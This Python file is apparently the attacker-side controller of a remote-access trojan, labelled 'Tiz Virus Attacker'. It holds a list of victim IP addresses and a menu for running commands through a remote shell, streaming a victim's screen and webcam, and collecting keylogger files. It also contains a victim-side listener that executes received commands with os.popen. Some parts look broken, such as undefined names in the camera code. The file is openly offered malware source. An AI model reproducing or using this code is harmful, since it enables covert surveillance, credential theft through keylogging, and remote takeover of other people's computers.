# -*- coding: utf-8 -*-
"""
Created on Dec 23 2020

@autor Tiz
"""

from __future__ import division
import numpy as np
import socket, argparse, sys, threading, os

# Danh sách các địa chỉ IP của victim
VICTIM_IPS = ['10.10.26.53', '10.0.2.15', '10.10.26.55']

#arguments parser
def parseargs():
    cli_args = argparse.ArgumentParser(description="Tiz Virus Attacker")
    cli_args.add_argument('--port', help="default port is 5000, revershell = port, camera stream = port+1, screen stream = port+2", default=5000, type=int)
    options = cli_args.parse_args(sys.argv[1:])
    
    # Dùng mảng VICTIM_IPS đã định nghĩa
    options.hosts = VICTIM_IPS
    return options

def check_victim_status(hosts, port):
    victims_status = {}
    for host in hosts:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)  # Set timeout to 1 second
            s.connect((host, port))
            victims_status[host] = "Connected"
            s.close()
        except socket.error:
            victims_status[host] = "Not reachable"
    return victims_status

def choose_victim(victims_status):
    print("Victim Status:")
    for i, (host, status) in enumerate(victims_status.items(), 1):
        print(f"{i}. {host} - {status}")
    
    while True:
        choice = input(f"Choose victim to connect (1-{len(victims_status)}): ")
        if choice.isdigit() and 1 <= int(choice) <= len(victims_status):
            selected_host = list(victims_status.keys())[int(choice) - 1]
            if victims_status[selected_host] == "Connected":
                return selected_host
            else:
                print(f"Victim {selected_host} is not reachable.")
        else:
            print("Invalid choice, try again.")

def display_action_menu():
    print("\n--- Action Menu ---")
    print("1. Execute Command via Reverse Shell")
    print("2. Stream Screen")
    print("3. Stream Camera")
    print("4. Receive File (Keylogger)")
    print("5. Exit")
    
    while True:
        choice = input("Choose an action (1-5): ")
        if choice.isdigit() and 1 <= int(choice) <= 5:
            return int(choice)
        else:
            print("Invalid choice, try again.")
def is_port_open(host, port, timeout=5):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    try:
        s.connect((host, port))
        s.close()
        return True
    except:
        return False
#reverse shell receiver

def R_tcp(host, port=5000):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    BUFFER_SIZE = 1024
    s.connect((host, port))
    message = s.recv(BUFFER_SIZE).decode()
    while True:
        command = input("Enter the command you wanna execute:")
        s.send(command.encode())
        if command.lower() == "exit":
            break
        results = s.recv(BUFFER_SIZE).decode()
        print(results)
    s.close()



#Screen receiver
def recvall(conn, length):
    buf = b''
    while len(buf) < length:
        data = conn.recv(length - len(buf))
        if not data:
            return data
        buf += data
    return buf

def screenreceiver(host, port):
    import pygame, zlib
    WIDTH = 1900
    HEIGHT = 1000
    pygame.init()
    screen = pygame.display.set_mode((WIDTH, HEIGHT))
    clock = pygame.time.Clock()
    with socket.socket() as sock:
        sock.connect((host, port))
        watching = True
        while watching:
            for event in pygame.event.get():
                if event.type == pygame.QUIT:
                    watching = False
                    break
            size_len = int.from_bytes(sock.recv(1), byteorder='big')
            size = int.from_bytes(sock.recv(size_len), byteorder='big')
            pixels = recvall(sock, size)
            pixels = zlib.decompress(pixels)
            img = pygame.image.fromstring(pixels, (WIDTH, HEIGHT), 'RGB')
            screen.blit(img, (0, 0))
            pygame.display.flip()
            clock.tick(60)

#camera receiver
def dump_buffer(s):
    """ Emptying buffer frame """
    while True:
        seg, addr = s.recvfrom(MAX_DGRAM)
        if struct.unpack("B", seg[0:1])[0] == 1:
            break

def camreceiver(host, port): 
    import cv2
    import numpy as np
    import struct

    s = socket.socket()
    s.connect((host, port))
    dat = b''
    while True:
        seg, addr = s.recvfrom(MAX_DGRAM)
        if struct.unpack("B", seg[0:1])[0] > 1:
            dat += seg[1:]
        else:
            dat += seg[1:]
            print(f"Received data size: {len(dat)} bytes")
            try:
                img = cv2.imdecode(np.frombuffer(dat, dtype=np.uint8), cv2.IMREAD_COLOR)
                if img is not None and img.size > 0:
                    cv2.imshow('frame', img)
                    if cv2.waitKey(1) & 0xFF == ord('q'):
                        break
                else:
                    print("Failed to decode image: Image is None or empty")
            except Exception as e:
                print(f"Error decoding image: {e}")
            dat = b''
    cv2.destroyAllWindows()
    s.close()

def receive_file(host, port, save_directory='received_files'):
    if not os.path.exists(save_directory):
        os.makedirs(save_directory)

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
        s.bind((host, port))
        s.listen()
        print(f"Listening for files on {host}:{port}")
        conn, addr = s.accept()
        with conn:
            print(f"Connected by {addr}")
            while True:
                try:
                    file_info = conn.recv(1024).strip().decode('utf-8')
                    if not file_info:
                        print("No more file info received.")
                        break

                    filename, filesize = file_info.split('|')
                    filesize = int(filesize)
                    print(f"Receiving {filename} with size {filesize} bytes")

                    filepath = os.path.join(save_directory, filename)
                    with open(filepath, 'wb') as f:
                        remaining = filesize
                        while remaining > 0:
                            chunk_size = 4096 if remaining >= 4096 else remaining
                            chunk = conn.recv(chunk_size)
                            if not chunk:
                                break
                            f.write(chunk)
                            remaining -= len(chunk)
                        print(f"Received {filename} successfully! Saved to {filepath}")
                except Exception as e:
                    print(f"Error receiving file: {e}")
                    break


def start_victim_reverse_shell(port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("0.0.0.0", port))
    s.listen(1)
    print(f"Victim listening on port {port}...")

    conn, addr = s.accept()
    print(f"Connection from {addr} established.")

    while True:
        command = conn.recv(1024).decode()
        if command.lower() == "exit":
            break
        try:
            # Thực hiện lệnh và trả về kết quả
            result = os.popen(command).read()
            conn.send(result.encode())
        except Exception as e:
            conn.send(f"Error: {str(e)}".encode())
    
    conn.close()
    s.close()
if __name__ == '__main__':
    options = parseargs()
    
    victims_status = check_victim_status(options.hosts, options.port)
    selected_host = choose_victim(victims_status)

    while True:
        action = display_action_menu()

        if action == 1:  # Reverse Shell
           R_tcp(selected_host, options.port)


        elif action == 2:  # Stream Screen
            threadscreen = threading.Thread(target=screenreceiver, args=(selected_host, options.port+1))
            threadscreen.start()

        elif action == 3:  # Stream Camera
            MAX_DGRAM = 2**16
            threadcam = threading.Thread(target=camreceiver, args=(selected_host, options.port+2))
            threadcam.start()

        elif action == 4:  # Receive File (Keylogger)
            file_transfer_port = options.port + 3
            threadfile = threading.Thread(target=receive_file, args=("0.0.0.0", file_transfer_port))
            threadfile.start()

        elif action == 5:  # Exit
            print("Exiting program.")
            choose_victim(victims_status)
